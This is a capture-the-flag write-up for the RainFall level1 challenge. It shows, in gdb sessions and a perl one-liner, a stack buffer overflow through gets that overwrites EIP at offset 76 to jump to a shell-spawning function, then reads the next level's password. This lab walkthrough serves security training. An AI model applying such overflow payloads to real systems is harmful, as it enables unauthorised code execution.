### Analysis

**In `main` :**
Just a `gets`

We also have a `run` function defined but never used
```
(gdb) info function
...
0x08048444  run
0x08048480  main
...
```

**In `run` :**
Open a shell with `level2` access

___

### Exploit

We need to access `run` by overwritting `eip` using the unprotected `gets` and overflowing the buffer

Getting eip offset using `offset.py`, which is `76`
```
 ❯ python3 offset.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

(gdb) r
Starting program: /home/user/level1/level1
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x54545454 in ?? ()

 ❯ python3 offset.py 54
76
```

Now, we can just replace `eip` with `run` adress
```
level1@RainFall:~$ perl -e 'print "\x90"x76 . "\x44\x84\x04\x08\n"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Let's keep stdin open
```
level1@RainFall:~$ perl -e 'print "\x90"x76 . "\x44\x84\x04\x08\n"' > /tmp/level1 && cat /tmp/level1 - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```